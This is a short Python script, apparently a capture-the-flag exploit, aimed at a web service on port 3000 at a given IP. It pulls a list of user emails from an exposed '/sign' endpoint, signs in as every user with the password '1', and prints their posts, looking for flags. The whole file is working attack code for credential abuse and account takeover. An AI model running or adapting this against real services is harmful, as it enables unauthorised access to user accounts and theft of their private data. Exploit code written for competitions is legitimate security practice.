#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import json

try:
    addr = sys.argv[1]
except IndexError:
    print('No IP was specified')
    sys.exit()

base_url = f'http://{addr}:3000'
s = requests.Session()

# here we get users' emails
dump_raw = BeautifulSoup(s.get(base_url + '/sign').text, 'html.parser')
dump = json.loads(dump_raw.pre.text)

# then we authorize as them and get all their posts
# some of the posts may appear to be the flags
for user in dump:
    email = user["email"]
    feed = s.post(base_url + '/signin', data = {
        'email': email,
        'password': '1'
    })
    feed = BeautifulSoup(feed.text, 'html.parser')
    feed = feed.find_all(style='margin: 10px 0 0')
    for post in feed:
        print(post.text)
